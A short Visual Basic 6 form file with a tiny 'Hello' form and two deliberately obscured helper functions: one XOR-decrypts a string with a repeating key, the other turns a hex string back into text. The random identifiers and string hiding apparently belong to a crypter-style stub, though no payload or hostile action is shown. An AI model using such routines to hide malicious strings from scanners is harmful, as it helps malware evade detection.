VERSION 5.00
Begin VB.Form ASDx 
   Caption         =   "Hello"
   ClientHeight    =   720
   ClientLeft      =   60
   ClientTop       =   405
   ClientWidth     =   2205
   Icon            =   "ASDx.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   720
   ScaleWidth      =   2205
   StartUpPosition =   3  'Windows Default
End
Attribute VB_Name = "ASDx"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False


Public Function JQkAa4mA3Z(ByVal Fver480nNI As String, ByVal jtnsP3N2P6 As String) As String
Dim HJOduS4CZA As Long
For HJOduS4CZA = 1 To Len(Fver480nNI)
JQkAa4mA3Z = JQkAa4mA3Z & Chr(Asc(Mid(jtnsP3N2P6, IIf(HJOduS4CZA Mod Len(jtnsP3N2P6) <> 0, HJOduS4CZA Mod Len(jtnsP3N2P6), Len(jtnsP3N2P6)), 1)) Xor Asc(Mid(Fver480nNI, HJOduS4CZA, 1)))
Next HJOduS4CZA
End Function
Public Function ZTlCVRR7t9(ByVal hbM07BbYVl As String) As String
Dim EbR2nsP5ED As String
Dim vg3O9ywLt9 As String
Dim ZIjUjalOPf As Long
For ZIjUjalOPf = 1 To Len(hbM07BbYVl) Step 2
EbR2nsP5ED = Chr$(Val("&H" & Mid$(hbM07BbYVl, ZIjUjalOPf, 2)))
vg3O9ywLt9 = vg3O9ywLt9 & EbR2nsP5ED
Next ZIjUjalOPf
ZTlCVRR7t9 = vg3O9ywLt9
End Function
